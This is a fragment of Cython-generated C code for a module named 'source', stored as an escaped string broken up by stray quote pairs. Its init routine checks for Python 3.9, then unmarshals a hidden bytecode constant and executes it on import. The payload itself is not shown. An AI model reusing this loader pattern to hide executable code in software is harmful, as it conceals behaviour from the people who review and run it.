__pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  Py_INCREF(__pyx_d);\\\\n  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  Py_INCREF(__pyx_b);\\\\n  __pyx_cython_runtime = PyImport_AddModule((char *) \\\\\\\"cython_runtime\\\\\\\"); if (unlikely(!__pyx_cython_runtime)) _\\\"\\\"_PYX_ERR(0, 4, __pyx_L1_error)\\\\n  Py_INCREF(__pyx_cython_runtime);\\\\n  if (PyObject_SetAttrString(__pyx_m, \\\\\\\"__builtins__\\\\\\\", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  /*--- Initialize various global constants etc. ---*/\\\\n  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)\\\\n  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  #endif\\\\n  if (__p\"\"yx_module_is_main_source) {\\\\n    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  }\\\\n  #if PY_MAJOR_VERSION >= 3\\\\n  {\\\\n    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n    if (!PyDict_GetItemString(modules, \\\\\\\"source\\\\\\\")) {\\\\n      if (unlikely(PyDict_SetItemString(modules, \\\\\\\"source\\\\\\\", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n    }\\\\n  }\\\\n  #endif\\\\n  /*--- Builtin init code ---*/\\\\n  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  /*--- Constants init code ---*/\\\\n  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  /*--- Global type/function init code ---*/\\\\n  (void)__Pyx_modinit_global_init_code();\\\\n  (void)__Pyx_modinit_variable_export_code();""\\\\n  (void)__Pyx_modinit_function_export_code();\\\\n  (void)__Pyx_modinit_type_init_code();\\\\n  (void)__Pyx_modinit_type_import_code();\\\\n  (void)__Pyx_modinit_variable_import_code();\\\\n  (void)__Pyx_modinit_function_import_code();\\\\n  /*--- Execution code ---*/\\\\n  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)\\\\n  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  #endif\\\\n\\\\n  \\\\n  __pyx_t_1 = __Pyx_Import(__pyx_n_s_marshal, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_1);\\\\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_marshal, __pyx_t_1) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t\\\"\\\"_1 = 0;\\\\n\\\\n  \\\\n  __pyx_t_1 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_1);\\\\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\\\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\\\n\\\\n  \\\\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_1);\\\\n  __pyx_t_2 = __Pyx_Py\"\"Object_GetAttrStr(__pyx_t_1, __pyx_n_s_version); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_2);\\\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\\\n  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_split); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_1);\\\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\\\n  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_2);\\\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\\\n  __pyx_t_1 = __Pyx_GetItemInt(__pyx_t_2, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_""1);\\\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\\\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_split); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_2);\\\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\\\n  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__4, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_1);\\\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\\\n  __pyx_t_2 = __Pyx_PyObject_GetSlice(__pyx_t_1, 0, -1L, NULL, NULL, &__pyx_slice__5, 0, 1, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_2);\\\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\\\n  __pyx_t_1 = PyUnicode_Join(__pyx_kp_u_, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)\\\\n  __Pyx_GOTRE\\\"\\\"F(__pyx_t_1);\\\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\\\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PYTHON_VERSION, __pyx_t_1) < 0) __PYX_ERR(0, 8, __pyx_L1_error)\\\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\\\n\\\\n  \\\\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_PYTHON_VERSION); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_1);\\\\n  __pyx_t_3 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u\"\"_3_9, Py_NE)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 9, __pyx_L1_error)\\\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\\\n  if (__pyx_t_3) {\\\\n\\\\n    \\\\n    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)\\\\n    __Pyx_GOTREF(__pyx_t_1);\\\\n    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_version); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)\\\\n    __Pyx_GOTREF(__pyx_t_2);\\\\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\\\n    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_split); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)\\\\n    __Pyx_GOTREF(__pyx_t_1);\\\\n    __P""yx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\\\n    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)\\\\n    __Pyx_GOTREF(__pyx_t_2);\\\\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\\\n    __pyx_t_1 = __Pyx_GetItemInt(__pyx_t_2, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)\\\\n    __Pyx_GOTREF(__pyx_t_1);\\\\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\\\n\\\\n    \\\\n    __pyx_t_2 = PyUnicode_Replace(__pyx_kp_u_No_support_for_VALUE, __pyx_kp_u_VERSION, __pyx_t_1, -1L); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)\\\\n    __Pyx_GOTREF(__pyx_t_2);\\\\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\\\n    __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)\\\\n    __Pyx_GOTREF(__pyx_t_1);\\\\n    __Pyx_DECREF(__pyx_t_2\\\"\\\"); __pyx_t_2 = 0;\\\\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\\\n\\\\n    \\\\n    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__6, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)\\\\n    __Pyx_GOTREF(__pyx_t_1);\\\\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\\\n\\\\n    \\\\n  }\\\\n\\\\n  \\\\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_marshal); if (unlikely(!__py\"\"x_t_1)) __PYX_ERR(0, 14, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_1);\\\\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_loads); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_2);\\\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\\\n  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__7, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 14, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_1);\\\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\\\n  __pyx_t_2 = __Pyx_PyExecGlobals(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_""t_2);\\\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\\\n\\\\n  \\\\n  __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_t_2);\\\\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_2) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\\\n\\\\n  /*--- Wrapped vars code ---*/\\\\n\\\\n  goto __pyx_L0;\\\\n  __pyx_L1_error:;\\\\n  __Pyx_XDECREF(__pyx_t_1);\\\\n  __Pyx_XDECREF(__pyx_t_2);\\\\n  if (__pyx_m) {\\\\n    if (__pyx_d) {\\\\n      __Pyx_AddTraceback(\\\\\\\"init source\\\\\\\", __pyx_clineno, __pyx_lineno, __pyx_filename);\\\\n    }\\\\n    Py_CLEAR(__pyx_m);\\\\n  } else if (!PyErr_Occurred()) {\\\\n    PyErr_SetString(PyExc_ImportError, \\\\\\\"init source\\\\\\\");\\\\n  }\\\\n  __pyx_L0:;\\\\n  __Pyx_RefNannyFinishContext();\\\\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\\\\n  return (__pyx_m != NULL) ? 0 : -1;\\\\n  #elif PY_MAJOR_VERSION >= 3\\\\n  return __pyx_m;\\\\n  #else\\\\n  return;\\\\n  #endif\\\\n}\\\\n\\\\n/* --- Runtime support code --- */\\\\n/* Refnanny */\\\\n#if C\\\"\\\"YTHON_REFNANNY\\\\nstatic __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {\\\\n    PyObject *m = NULL, *p = NULL;\\\\n    void *r = NULL;\\\\n    m = PyImport_ImportModule(modname);\\\\n    if (!m) goto end;\\\\n    p = PyObject_GetAttrString(m, \\\\\\\"RefNannyAPI\\\\\\\");\\\\n    if (!p) goto end;\\\\n    r = PyLong_AsVo\"\"idPtr(p);\\\\nend:\\\\n    Py_XDECREF(p);\\\\n    Py_XDECREF(m);\\\\n    return (__Pyx_RefNannyAPIStruct *)r;\\\\n}\\\\n#endif\\\\n\\\\n/* PyObjectGetAttrStr */\\\\n#if CYTHON_USE_TYPE_SLOTS\\\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {\\\\n    PyTypeObject* tp = Py_TYPE(obj);\\\\n    if (likely(tp->tp_getattro))\\\\n        return tp->tp_getattro(obj, attr_name);\\\\n#if PY_MAJOR_VERSION < 3\\\\n    if (likely(tp->tp_getattr)"")\\\\n        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));\\\\n#endif\\\\n    return PyObject_GetAttr(obj, attr_name);\\\\n}\\\\n#endif\\\\n\\\\n/* GetBuiltinName */\\\\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name) {\\\\n    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);\\\\n    if (unlikely(!result)) {\\\\n        PyErr_Format(PyExc_NameError,\\\\n#if PY_MAJOR_VERSION >= 3\\\\n            \\\\\\\"name '%U' is not defined\\\\\\\", name);\\\\n#else\\\\n            \\\\\\\"name '%.200s' is not defined\\\\\\\", PyString_AS_STRING(name));\\\\n#endif\\\\n    }\\\\n    return result;\\\\n}\\\\n\\\\n/* Import */\\\\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {\\\\n    PyObject *empty_list = 0;\\\\n    PyObject *module = 0;\\\\n    PyObject *global_dict = 0;\\\\n    PyObject *empty_dict = 0;\\\\n    PyObject *list;\\\\n    #if PY_MAJOR_VERSION < 3\\\\n    PyObject *py_import;\\\\n    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);\\\\n    if (!py_import)\\\\n        goto bad;\\\\n    #endif\\\\n    if (from_list)\\\\n        list = from_list;\\\\n    else {\\\\n        empty_list = PyList_New(0);\\\\n        if (!empty_list)\\\\n            goto bad;\\\\n        list = empty_list;\\\\n    }\\\\n    global_dict = PyModule_GetDict(__pyx_m);\\\\n    if (!global_dict)\\\\n        goto bad;\\\\n    empty_dict =\\\"\\\" PyDict_New();\\\\n    if (!empty_dict)\\\\n        goto bad;\\\\n    {\\\\n        #if PY_MAJOR_VERSION >= 3\\\\n        if (level == -1) {\\\\n            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {\\\\n                module = PyImport_ImportModule\"\"LevelObject(\\\\n                    name, global_dict, empty_dict, list, 1);\\\\n                if (!module) {\\\\n                    if (!PyErr_ExceptionMatches(PyExc_ImportError))\\\\n                        goto bad;\\\\n                    PyErr_Clear();\\\\n                }\\\\n            }\\\\n            level ="" 0;\\\\n        }\\\\n        #endif\\\\n        if (!module) {\\\\n            #if PY_MAJOR_VERSION < 3\\\\n            PyObject *py_level = PyInt_FromLong(level);\\\\n            if (!py_level)\\\\n                goto bad;\\\\n            module = PyObject_CallFunctionObjArgs(py_import,\\\\n                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);\\\\n            Py_DECREF(py_level);\\\\n            #else\\\\n            module = PyImport_ImportModuleLevelObject(\\\\n                name, global_dict, empty_dict, list, level);\\\\n            #endif\\\\n        }\\\\n    }\\\\nbad:\\\\n    #if PY_MAJOR_VERSION < 3\\\\n    Py_XDECREF(py_import);\\\\n    #endif\\\\n    Py_XDECREF(empty_list);\\\\n    Py_XDECREF(empty_dict);\\\\n    return module;\\\\n}\\\\n\\\\n/* PyDictVersioning */\\\\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\\\\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {\\\\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\\\\n    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;\\\\n}\\\\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {\\\\n    PyObject **dictptr = NULL;\\\\n    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;\\\\n    if (offset) {\\\\n#if CYTHON_COMPILING_IN_CPYTHON\\\\n        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);\\\\n#else\\\\n        dictptr = _PyObject_GetDictPtr(obj);\\\\n#endif\\\\n    }\\\\n    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;\\\\n}\\\\nstatic CYT\\\"\\\"HON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {\\\\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\\\\n    \"\"if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))\\\\n        return 0;\\\\n    return obj_dict_version == __Pyx_get_object_dict_version(obj);\\\\n}\\\\n#endif\\\\n\\\\n/* GetMo""duleGlobalName */\\\\n#if CYTHON_USE_DICT_VERSIONS\\\\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)\\\\n#else\\\\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)\\\\n#endif\\\\n{\\\\n    PyObject *result;\\\\n#if !CYTHON_AVOID_BORROWED_REFS\\\\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1\\\\n    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);\\\\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\\\\n    if (likely(result)) {\\\\n        return __Pyx_NewRef(result);\\\\n    } else if (unlikely(PyErr_Occurred())) {\\\\n        return NULL;\\\\n    }\\\\n#else\\\\n    result = PyDict_GetItem(__pyx_d, name);\\\\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\\\\n    if (likely(result)) {\\\\n        return __Pyx_NewRef(result);\\\\n    }\\\\n#endif\\\\n#else\\\\n    result = PyObject_GetItem(__pyx_d, name);\\\\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\\\\n    if (likely(result)) {\\\\n        return __Pyx_NewRef(result);\\\\n    }\\\\n    PyErr_Clear();\\\\n#endif\\\\n    return __Pyx_GetBuiltinName(name);\\\\n}\\\\n\\\\n/* PyObjectCall */\\\\n#if CYTHON_COMPILING_IN_CPYTHON\\\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {\\\\n    PyObject *result;\\\\n    ternaryfunc call = Py_TYPE(func)->tp_call;\\\\n    if (unlikely(!call))\\\\n        return PyObject_Call(func, arg, kw);\\\\n    if (unlikely(Py_EnterRecursiveCall((char*)\\\\\\\" while calling a Python object\\\\\\\")))\\\\n        return NULL;\\\\n    result = (*call)(func, arg, kw);\\\\n    Py_Leav\\\"\\\"eRecursiveCall();\\\\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\\\\n        PyErr_SetString(\\\\n       \"\"     PyExc_SystemError,\\\\n            \\\\\\\"NULL result without error in PyObject""_Call\\\\\\\");\\\\n    }\\\\n    return result;\\\\n}\\\\n#endif\\\\n\\\\n/* GetItemInt */\\\\nstatic PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {\\\\n    PyObject *r;\\\\n    if (!j) return NULL;\\\\n    r = PyObject_GetItem(o, j);\\\\n    Py_DECREF(j);\\\\n    return r;\\\\n}\\\\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,\\\\n                                                              CYTHON_NCP_UNUSED int wraparound,\\\\n                                                              CYTHON_NCP_UNUSED int boundscheck) {\\\\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\\\\n    Py_ssize_t wrapped_i = i;\\\\n    if (wraparound & unlikely(i < 0)) {\\\\n        wrapped_i += PyList_GET_SIZE(o);\\\\n    }\\\\n    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {\\\\n        PyObject *r = PyList_GET_ITEM(o, wrapped_i);\\\\n        Py_INCREF(r);\\\\n        return r;\\\\n    }\\\\n    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));\\\\n#else\\\\n    return PySequence_GetItem(o, i);\\\\n#endif\\\\n}\\\\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,\\\\n                                                              CYTHON_NCP_UNUSED int wraparound,\\\\n                                                              CYTHON_NCP_UNUSED int boundscheck) {\\\\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\\\\n    Py_ssize_t wrapped_i = i;\\\\n    if (wraparound & unlikely(i < 0)) {\\\\n        wrapped_i += PyTuple_GET_SIZE(o);\\\\n    }\\\\n    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {\\\\n        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);\\\\n        Py_INCREF(r);\\\\n        return r;\\\\n    }\\\\n    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));\\\\n#else\\\\n    return PySequence_GetItem(o, i);\\\\n#endif\\\"\\\"\\\\n}\\\\nstatic CYTHON_INLINE P""yObject *__Pyx_GetItemInt_Fas\"\"t(PyObject *o, Py_ssize_t i, int is_list,\\\\n                                                     CYTHON_NCP_UNUSED int wraparound,\\\\n                                                     CYTHON_NCP_UNUSED int boundscheck) {\\\\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS\\\\n    if (is_list || PyList_CheckExact(o)) {\\\\n        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);\\\\n        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {\\\\n            PyObject *r = PyList_GET_ITEM(o, n);\\\\n            Py_INCREF(r);\\\\n            return r;\\\\n        }\\\\n    }\\\\n    else if (PyTuple_CheckExact(o)) {\\\\n        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);\\\\n        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {\\\\n            PyObject *r = PyTuple_GET_ITEM(o, n);\\\\n            Py_INCREF(r);\\\\n            return r;\\\\n        }\\\\n    } else {\\\\n        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;\\\\n        if (likely(m && m->sq_item)) {\\\\n            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {\\\\n                Py_ssize_t l = m->sq_length(o);\\\\n                if (likely(l >= 0)) {\\\\n                    i += l;\\\\n                } else {\\\\n                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))\\\\n                        return NULL;\\\\n                    PyErr_Clear();\\\\n                }\\\\n            }\\\\n            return m->sq_item(o, i);\\\\n        }\\\\n    }\\\\n#else\\\\n    if (is_list || PySequence_Check(o)) {\\\\n        return PySequence_GetItem(o, i);\\\\n    }\\\\n#endif\\\\n    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));\\\\n}\\\\n\\\\n/* SliceObject */\\\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,\\\\n        Py_ssize_t cstart, Py""_ssize_t cstop,\\\\n        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,\\\\n        int has_cstar\\\"\\\"t, in\"\"t has_cstop, CYTHON_UNUSED int wraparound) {\\\\n#if CYTHON_USE_TYPE_SLOTS\\\\n    PyMappingMethods* mp;\\\\n#if PY_MAJOR_VERSION < 3\\\\n    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;\\\\n    if (likely(ms && ms->sq_slice)) {\\\\n        if (!has_cstart) {\\\\n            if (_py_start && (*_py_start != Py_None)) {\\\\n                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);\\\\n                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;\\\\n            } else\\\\n                cstart = 0;\\\\n        }\\\\n        if (!has_cstop) {\\\\n            if (_py_stop && (*_py_stop != Py_None)) {\\\\n                cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);\\\\n                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;\\\\n            } else\\\\n                cstop = PY_SSIZE_T_MAX;\\\\n        }\\\\n        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {\\\\n            Py_ssize_t l = ms->sq_length(obj);\\\\n            if (likely(l >= 0)) {\\\\n                if (cstop < 0) {\\\\n                    cstop += l;\\\\n                    if (cstop < 0) cstop = 0;\\\\n                }\\\\n                if (cstart < 0) {\\\\n                    cstart += l;\\\\n                    if (cstart < 0) cstart = 0;\\\\n                }\\\\n            } else {\\\\n                if (!PyErr_ExceptionMatches(PyExc_OverflowError))\\\\n                    goto bad;\\\\n                PyErr_Clear();\\\\n            }\\\\n        }\\\\n        return ms->sq_slice(obj, cstart, cstop);\\\\n    }\\\\n#endif\\\\n    mp = Py_TYPE(obj)->tp_as_mapping;\\\\n    if (likely(mp && mp->mp_subscript))\\\\n#endif\\\\n    {\\\\n        PyObject* result;\\\\n        PyObject *py_slice, *py_start, *py_stop;\\\\n        if (_py_slice) {\\\\n            py_slice = *_py_slice;""\\\\n        } else {\\\\n            PyObject* owned_start = NULL;\\\\n            PyObject* owned_stop = NULL;\\\\n            if (_py_start) {\\\\n                py_start = *_py_start;\\\\n            } else {\\\\n                if (has_c\"\"start) {\\\\n                    owned_start = py_st\\\"\\\"art = PyInt_FromSsize_t(cstart);\\\\n                    if (unlikely(!py_start)) goto bad;\\\\n                } else\\\\n                    py_start = Py_None;\\\\n            }\\\\n            if (_py_stop) {\\\\n                py_stop = *_py_stop;\\\\n            } else {\\\\n                if (has_cstop) {\\\\n                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);\\\\n                    if (unlikely(!py_stop)) {\\\\n                        Py_XDECREF(owned_start);\\\\n                        goto bad;\\\\n                    }\\\\n                } else\\\\n                    py_stop = Py_None;\\\\n            }\\\\n            py_slice = PySlice_New(py_start, py_stop, Py_None);\\\\n            Py_XDECREF(owned_start);\\\\n            Py_XDECREF(owned_stop);\\\\n            if (unlikely(!py_slice)) goto bad;\\\\n        }\\\\n#if CYTHON_USE_TYPE_SLOTS\\\\n        result = mp->mp_subscript(obj, py_slice);\\\\n#else\\\\n        result = PyObject_GetItem(obj, py_slice);\\\\n#endif\\\\n        if (!_py_slice) {\\\\n            Py_DECREF(py_slice);\\\\n        }\\\\n        return result;\\\\n    }\\\\n    PyErr_Format(PyExc_TypeError,\\\\n        \\\\\\\"'%.200s' object is unsliceable\\\\\\\", Py_TYPE(obj)->tp_name);\\\\nbad:\\\\n    return NULL;\\\\n}\\\\n\\\\n/* BytesEquals */\\\\nstatic CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {\\\\n#if CYTHON_COMPILING_IN_PYPY\\\\n    return PyObject_RichCompareBool(s1, s2, equals);\\\\n#else\\\\n    if (s1 == s2) {\\\\n        return (equals == Py_EQ);\\\\n    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {\\\\n        const char *ps1, *ps2;\\\\n        Py""_ssize_t length = PyBytes_GET_SIZE(s1);\\\\n        if (length != PyBytes_GET_SIZE(s2))\\\\n            return (equals == Py_NE);\\\\n        ps1 = PyBytes_AS_STRING(s1);\\\\n        ps2 = PyBytes_AS_STRING(s2);\\\\n        if (ps1[0] != ps2[0]) {\\\\n            return (equals == Py_NE);\\\\n        } else if (length == 1) {\\\\n            return (equals == Py_EQ);\"\"\\\\n        } else {\\\\n            int result;\\\\n#if CYTHON_USE_UNICODE_INTERNALS && (PY_VERSION_HEX < 